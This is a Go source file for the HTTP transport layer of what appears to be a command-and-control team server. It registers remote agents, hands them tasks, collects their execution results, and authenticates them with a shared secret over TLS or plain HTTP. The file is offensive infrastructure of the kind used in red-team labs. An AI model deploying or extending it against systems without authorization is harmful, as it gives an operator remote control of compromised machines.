package transport

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"net/http"

	"github.com/had-nu/Go-ServerC2-Payload/internal/agentstore"
	"github.com/had-nu/Go-ServerC2-Payload/internal/c2proto"
)

// Server holds the HTTP handlers of the Team Server.
type Server struct {
	store  *agentstore.Store
	secret string
	log    *slog.Logger
	mux    *http.ServeMux
	events chan<- Event
}

// Event is a message for the operator console. The HTTP handlers write events
// to a channel, so console output does not interleave with request output.
type Event struct {
	Kind   EventKind
	Agent  string
	TaskID string
	Text   string
}

// EventKind tells the console what to print.
type EventKind int

// Event kinds.
const (
	EventAgentNew EventKind = iota
	EventResult
)

// NewServer returns a Server. The events channel may be nil.
func NewServer(store *agentstore.Store, secret string, log *slog.Logger, events chan<- Event) *Server {
	s := &Server{
		store:  store,
		secret: secret,
		log:    log,
		events: events,
		mux:    http.NewServeMux(),
	}
	// Go 1.22 and later match the method in the pattern. The handlers do not
	// need to check r.Method.
	s.mux.HandleFunc("GET /checkin", s.handleCheckin)
	s.mux.HandleFunc("POST /results", s.handleResults)
	return s
}

func (s *Server) emit(e Event) {
	if s.events == nil {
		return
	}
	select {
	case s.events <- e:
	default:
		s.log.Warn("console event channel is full, dropping an event")
	}
}

// handleCheckin registers an agent, refreshes it, and returns one task.
func (s *Server) handleCheckin(w http.ResponseWriter, r *http.Request) {
	if !s.authorize(w, r) {
		return
	}

	id := r.Header.Get(c2proto.HeaderAgentID)
	if err := c2proto.ValidateAgentID(id); err != nil {
		s.log.Warn("check-in rejected", "reason", err.Error(), "remote", RemoteIP(r).String())
		http.Error(w, "invalid agent ID", http.StatusBadRequest)
		return
	}

	hostname := c2proto.SanitizeHeader(r.Header.Get(c2proto.HeaderHostname), 255)
	task, isNew := s.store.Checkin(id, hostname, RemoteIP(r))

	if isNew {
		host := hostname
		if host == "" {
			host = "unknown"
		}
		s.log.Info("agent registered", "agent", id, "host", host, "ip", RemoteIP(r).String())
		s.emit(Event{Kind: EventAgentNew, Agent: id, Text: fmt.Sprintf("[+] agent registered: %s (%s) from %s", c2proto.ShortID(id), host, RemoteIP(r))})
	}

	// The store released its lock. Write the response without blocking other
	// agents.
	if task == nil {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	if err := json.NewEncoder(w).Encode(task); err != nil {
		s.log.Error("write the task response", "task", task.TaskID, "error", err)
	}
}

// handleResults stores the output of one executed task.
func (s *Server) handleResults(w http.ResponseWriter, r *http.Request) {
	if !s.authorize(w, r) {
		return
	}

	id := r.Header.Get(c2proto.HeaderAgentID)
	if err := c2proto.ValidateAgentID(id); err != nil {
		http.Error(w, "invalid agent ID", http.StatusBadRequest)
		return
	}
	if !s.store.Touch(id) {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	body := http.MaxBytesReader(w, r.Body, MaxRequestBody)
	defer body.Close()

	var result c2proto.Result
	if err := json.NewDecoder(body).Decode(&result); err != nil {
		var maxErr *http.MaxBytesError
		if errors.As(err, &maxErr) {
			http.Error(w, "request body too large", http.StatusRequestEntityTooLarge)
			return
		}
		http.Error(w, "invalid JSON body", http.StatusBadRequest)
		return
	}
	if err := c2proto.ValidateTaskID(result.TaskID); err != nil {
		http.Error(w, "invalid task ID", http.StatusBadRequest)
		return
	}

	s.log.Info("result received", "agent", id, "task", result.TaskID, "failed", result.IsError())
	s.emit(Event{Kind: EventResult, Agent: id, TaskID: result.TaskID, Text: renderResult(id, result)})
	w.WriteHeader(http.StatusOK)
}

func renderResult(agentID string, r c2proto.Result) string {
	short := c2proto.ShortID(agentID)
	if r.IsError() {
		return fmt.Sprintf("[*] result from %s (task %s): error: %s", short, r.TaskID, r.Error)
	}
	return fmt.Sprintf("[*] result from %s (task %s):\n%s", short, r.TaskID, r.Output)
}

func (s *Server) authorize(w http.ResponseWriter, r *http.Request) bool {
	if err := CheckSecret(r, s.secret); err != nil {
		s.log.Warn("request rejected", "path", r.URL.Path, "reason", err.Error(), "remote", RemoteIP(r).String())
		w.Header().Set("WWW-Authenticate", `Bearer realm="c2"`)
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return false
	}
	return true
}

// ServeHTTP lets Server satisfy http.Handler, which the tests use.
func (s *Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	s.mux.ServeHTTP(w, r)
}

// HTTPServer returns an http.Server with the project limits and TLS.
func HTTPServer(addr string, h http.Handler, cert tls.Certificate) *http.Server {
	return &http.Server{
		Addr:              addr,
		Handler:           h,
		TLSConfig:         &tls.Config{Certificates: []tls.Certificate{cert}, MinVersion: tls.VersionTLS12},
		ReadHeaderTimeout: ReadHeaderTimeout,
		ReadTimeout:       ReadTimeout,
		WriteTimeout:      WriteTimeout,
		IdleTimeout:       IdleTimeout,
		MaxHeaderBytes:    MaxHeaderBytes,
	}
}

// PlainHTTPServer returns an http.Server with the project limits and no TLS.
// The first version of this project used plain HTTP. The flag -tls-only=false
// keeps that mode for a lab network that carries the traffic in a tunnel.
func PlainHTTPServer(addr string, h http.Handler) *http.Server {
	return &http.Server{
		Addr:              addr,
		Handler:           h,
		ReadHeaderTimeout: ReadHeaderTimeout,
		ReadTimeout:       ReadTimeout,
		WriteTimeout:      WriteTimeout,
		IdleTimeout:       IdleTimeout,
		MaxHeaderBytes:    MaxHeaderBytes,
	}
}

// Listen starts the listener and serves plain HTTP in the background. It
// returns the listener so that the caller can shut the server down.
func Listen(srv *http.Server) (net.Listener, error) {
	ln, err := net.Listen("tcp", srv.Addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", srv.Addr, err)
	}
	go serve(srv, ln, false)
	return ln, nil
}

// ListenTLS starts the listener and serves HTTPS in the background.
func ListenTLS(srv *http.Server) (net.Listener, error) {
	ln, err := net.Listen("tcp", srv.Addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", srv.Addr, err)
	}
	go serve(srv, ln, true)
	return ln, nil
}

func serve(srv *http.Server, ln net.Listener, useTLS bool) {
	var err error
	if useTLS {
		err = srv.ServeTLS(ln, "", "")
	} else {
		err = srv.Serve(ln)
	}
	if err != nil && !errors.Is(err, http.ErrServerClosed) {
		slog.Error("the server stopped", "error", err)
	}
}

// Shutdown stops the server and waits for the open requests.
func Shutdown(srv *http.Server) error {
	ctx, cancel := context.WithTimeout(context.Background(), ShutdownTimeout)
	defer cancel()
	return srv.Shutdown(ctx)
}
